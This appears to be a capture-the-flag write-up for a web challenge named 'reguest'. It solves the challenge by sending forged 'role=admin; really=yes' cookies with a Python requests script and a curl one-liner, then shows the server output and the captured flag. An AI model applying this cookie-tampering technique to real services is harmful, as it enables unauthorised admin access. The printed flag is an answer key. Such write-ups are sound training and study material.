## reguest

<details>
  <summary>Description</summary>
  
  > Desc: HTTP requests and libraries are hard. Sometimes they do not behave as expected, which might lead to vulnerabilities. <br>
  > http://52.59.124.14:10014 <br>

  > [chall.zip](./chall.zip)
  
</details>

We can send an HTTP GET request using the cURL utility to the address http://52.59.124.14:10014, including a cookie in the request header.

```python3
import requests

url = 'http://52.59.124.14:10014'
cookies = {'role': 'admin', 'really': 'yes'}
resp = requests.get(url, cookies=cookies)

print(resp.content.decode())
```

The -b argument is used to specify the cookie that will be included in the request header. The value of the cookie is `role=admin; really=yes`. This cookie can be used by the server for authentication or other settings.

In this case, the request is targeted to a web service that requires authorization at the 'admin' level and requests confirmation from the user ('really=yes').

Or use this simple payloads

```bash
$ curl -b "role=admin; really=yes" http://52.59.124.14:10014

Usage: Look at the code ;-)

Overwriting cookies with default value! This must be secure!
Prepared request cookies are: [('really', 'yes'), ('role', 'guest')]
Sending request...
Request cookies are: [('really', 'yes'), ('role', 'guest')]

Someone's drunk oO

Response is: Admin: ENO{R3Qu3sts_4r3_s0m3T1m3s_we1rd_dont_get_confused}
```

<details>
  <summary>Flag</summary>
  
  > `ENO{R3Qu3sts_4r3_s0m3T1m3s_we1rd_dont_get_confused}`
  
</details>
